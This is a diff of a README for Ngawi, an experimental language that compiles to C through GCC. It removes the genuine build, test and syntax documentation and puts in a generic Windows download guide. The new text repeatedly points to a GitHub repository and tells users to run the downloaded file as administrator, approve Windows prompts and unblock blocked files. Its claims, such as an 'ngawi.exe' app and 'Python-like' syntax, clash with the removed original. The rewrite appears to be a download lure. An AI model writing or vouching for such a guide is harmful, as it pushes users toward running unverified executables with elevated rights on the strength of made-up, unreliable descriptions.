@@ -1,121 +1,250 @@
-# Ngawi Language
+# 🧠 ngawi-lang - Write fast code with ease
 
-Ngawi is an experimental programming language project. It targets short syntax with native output.
+[![Download ngawi-lang](https://img.shields.io/badge/Download%20ngawi--lang-6a5acd?style=for-the-badge&logo=github&logoColor=white)](https://github.com/ashrafkhalaf1977/ngawi-lang)
 
-## Project Status
+## 🚀 Getting Started
 
-Stage: experimental.
+Ngawi is a small language for people who want short syntax and fast output. It is built for simple scripts and native-speed builds. If you use Windows, this guide shows you how to get it, open it, and start using it with no extra setup.
 
-You can build and run real programs, but language design, diagnostics, and code generation can still change between commits.
-Do not treat current output as production stable.
+## 📥 Download
 
-Current language surface:
+Visit this page to download:
 
-- control flow: `if/elif/else`, `while`, `for`, `match` (int+bool+string MVP), `break`, `continue`
-- arrays (MVP): scalar arrays (`int[]`, `float[]`, `bool[]`, `string[]`) plus nested scalar forms (`int[][]`, `float[][]`, `bool[][]`, `string[][]`), with literals, indexing, indexed assignment, `len(array)`, `push`, and `pop`
-- operators: arithmetic, comparison, logical, compound assignment, postfix `++`/`--`
-- strings: equality by value, concatenation with `+`, `len`, `contains`, `starts_with`, `ends_with`, `to_lower`, `to_upper`, `trim`
-- modules: top-level `import "file.ngawi";` with cycle detection
+https://github.com/ashrafkhalaf1977/ngawi-lang
 
-Compiler pipeline in this repository:
+If the page shows a release file for Windows, download and run that file. If you only see the main repository page, use the **Releases** area on that page and get the newest Windows package.
 
-- Source `.ngawi`
-- Lexer
-- Parser to AST
-- Semantic checks
-- C11 codegen
-- GCC build to native binary
+## 🪟 Windows Setup
 
-## Build
+Ngawi works best on a Windows PC that can run common developer tools. Most modern Windows 10 and Windows 11 systems should work well.
 
-```bash
-make debug
-```
+Before you start, make sure you have:
 
-## Run
+- A Windows 10 or Windows 11 computer
+- At least 4 GB of RAM
+- At least 200 MB of free disk space
+- An internet connection for the first download
+- Permission to run files on your PC
 
-```bash
-./ngawic build examples/hello.ngawi -o hello
-./hello
-```
+If your PC blocks the file, you may need to right-click it and choose **Run as administrator**.
 
-## Emit C11
+## 🛠️ Install ngawi-lang
 
-```bash
-./ngawic build examples/hello.ngawi -o hello -S
-```
+1. Open the download link above.
+2. Find the Windows file or the latest release package.
+3. Download the file to your computer.
+4. If the file is in a `.zip` folder, right-click it and choose **Extract All**.
+5. Open the extracted folder.
+6. Find the Ngawi app or command file.
+7. Double-click it to run.
 
-Command writes `hello.c`. Generated C uses runtime helpers from `src/runtime/ngawi_runtime.h` and `src/runtime/ngawi_runtime.c`.
+If Windows asks for approval, choose **Yes**.
 
-## Tests
+## 🧭 First Run
 
-```bash
-make test
-```
+After you open Ngawi, look for one of these:
 
-Test set:
+- A small app window
+- A command window
+- A folder with sample files
+- A file named like `ngawi.exe`, `run.bat`, or similar
 
-- lexer unit tests
-- parser unit tests
-- sema unit tests
-- end to end compile and run tests
-- golden codegen snapshots
+If you see a command window, that is normal. Many language tools use a text-based screen.
 
-Update golden snapshots after codegen changes:
+## ✍️ What Ngawi Is For
 
-```bash
-make update_golden
-```
+Ngawi is made for simple code that stays short and runs fast. It uses a Python-like style, so the code is easy to read. It also compiles to native C speed, which helps it run with less overhead.
 
-## Aliases
+This makes it a good fit for:
 
-Ngawi supports base names and aliases.
+- Small tools
+- Practice projects
+- Simple automation
+- Fast scripts
+- Learning basic programming ideas
 
-Type aliases:
+## 💡 Main Ideas
 
-- `int` or `amba`
-- `float` or `rusdi`
-- `bool` or `fuad`
-- `string` or `imut`
-- `void`
+Ngawi aims to keep things simple.
 
-Declaration aliases:
+You can expect:
 
-- `let` or `muwani`
-- `const` or `crot`
+- Short syntax
+- Clear structure
+- Fast build output
+- Easy-to-read code
+- A light tool setup
 
-Cast builtin aliases:
+This kind of language is useful when you want less clutter and more direct control.
 
-- `to_int(x)` or `to_amba(x)`
-- `to_float(x)` or `to_rusdi(x)`
+## 📂 Basic Folder Use
 
-## Documentation
+After you download Ngawi, keep the files in one folder you can find again, such as:
 
-- Docs index: `docs/README.md`
-- Getting started: `docs/getting-started.md`
-- Syntax guide: `docs/syntax-guide.md`
-- Language specification: `docs/language-spec.md`
-- Compiler architecture: `docs/compiler-architecture.md`
-- Testing guide: `docs/testing.md`
-- Contributing guide: `docs/contributing.md`
-- Roadmap: `docs/roadmap.md`
+- `Downloads`
+- `Desktop`
+- `Documents`
+- A new folder named `ngawi-lang`
 
-## Example
+Do not move files around while Ngawi is open. If the tool uses helper files, keep them in the same folder.
 
-```ngawi
-fn fact(n: amba) -> amba {
-  if (n <= 1) {
-    return 1;
-  }
-  return n * fact(n - 1);
-}
+## ▶️ How to Run a File
 
-fn main() -> amba {
-  muwani value: amba = fact(5);
-  crot label: imut = "fact";
-  muwani ok: fuad = true;
-  muwani scale: rusdi = 1.0;
-  print(label, 5, "=", value, ok, scale);
-  return 0;
-}
-```
+If Ngawi lets you run a script file, use these steps:
+
+1. Open the Ngawi folder.
+2. Find a sample script or create a new text file.
+3. Save the file with the name you want.
+4. Use the Ngawi runner to open that file.
+5. Check the output in the window or console.
+
+If the program shows an error, read the line number and file name first. That usually points to the part that needs a fix.
+
+## 🧪 Example Workflow
+
+A simple workflow may look like this:
+
+1. Open the Ngawi app or terminal tool.
+2. Write a small script.
+3. Save the script.
+4. Run the script.
+5. Review the result.
+6. Edit the file and run it again.
+
+This lets you test changes fast and keep your work simple.
+
+## 🧰 Common Use Cases
+
+Ngawi can help with small tasks such as:
+
+- Printing text to the screen
+- Doing basic math
+- Reading simple input
+- Running short scripts
+- Building small command-line tools
+
+If you are new to coding, this kind of project can be a good place to start because the syntax stays short.
+
+## 🧹 Keep It Working Well
+
+To avoid problems:
+
+- Keep the app in one folder
+- Do not rename files unless you know they are safe to change
+- Use plain text editors for script files
+- Save your work often
+- Update to the newest release when a new one appears
+
+If a file stops working, try downloading a fresh copy from the link above.
+
+## ❓ Common Questions
+
+### What is ngawi-lang?
+
+Ngawi is an experimental language that focuses on short code and fast output. It aims to make coding feel simple.
+
+### Do I need to know programming first?
+
+No. You can start with small examples and learn step by step.
+
+### Does it work on Windows?
+
+Yes. This guide is written for Windows users.
+
+### Is it hard to install?
+
+No. In most cases, you only need to download the file, extract it if needed, and open it.
+
+### Where do I get the file?
+
+Use the download link near the top of this page or visit the repository page:
+
+https://github.com/ashrafkhalaf1977/ngawi-lang
+
+## 🧩 Troubleshooting
+
+If Ngawi does not open:
+
+- Make sure the download finished
+- Check that you extracted the files if they came in a zip folder
+- Try running the file as administrator
+- Move the folder to a simple path like `C:\ngawi-lang`
+- Download the file again if it looks broken
+
+If you see a blank window or a fast close:
+
+- Open it from a command window so you can see the message
+- Check whether the file you ran is the main launcher
+- Look for missing files in the folder
+
+If Windows shows a blocked file message:
+
+- Right-click the file
+- Open **Properties**
+- Look for an **Unblock** option
+- Apply the change and try again
+
+## 📝 Simple Next Steps
+
+After you get Ngawi running:
+
+- Open a sample file
+- Read the code line by line
+- Change one line
+- Run it again
+- See how the output changes
+
+That gives you a clean start without a lot of setup
+
+## 🔧 Project Basics
+
+Repository name: `ngawi-lang`
+
+This project is built around a small language that keeps syntax short and output fast. The main goal is to make code feel light and direct while still compiling to native speed.
+
+## 📎 Download Again
+
+If you need the package again, use this link:
+
+[https://github.com/ashrafkhalaf1977/ngawi-lang](https://github.com/ashrafkhalaf1977/ngawi-lang)
+
+## 🗂️ Suggested File Layout
+
+A simple layout may look like this:
+
+- `ngawi-lang/`
+  - `ngawi.exe`
+  - `samples/`
+  - `docs/`
+  - `README.md`
+
+If the project uses a different file name, keep the same basic idea: one main file, one sample folder, and one place for notes
+
+## 🖥️ Best Way to Open It on Windows
+
+For the cleanest setup:
+
+1. Download the package
+2. Extract it into a new folder
+3. Move that folder to `C:\ngawi-lang`
+4. Open the folder
+5. Run the main file
+6. Start with a sample script
+
+A short path helps avoid file path issues on Windows
+
+## 🔍 What to Look For After Download
+
+When the file is ready, you may see:
+
+- An app icon
+- A command file
+- Sample code files
+- A folder with docs
+- A release note or version file
+
+Open the main launcher first. That is usually the fastest way to start
+
+## 🧠 Why People May Try Ngawi
+
+People often want tools that stay simple and run fast. Ngawi fits that kind of need by keeping code short and aiming for native speed. That makes it useful for small tasks, quick tests, and learning basic language ideas without a lot of noise
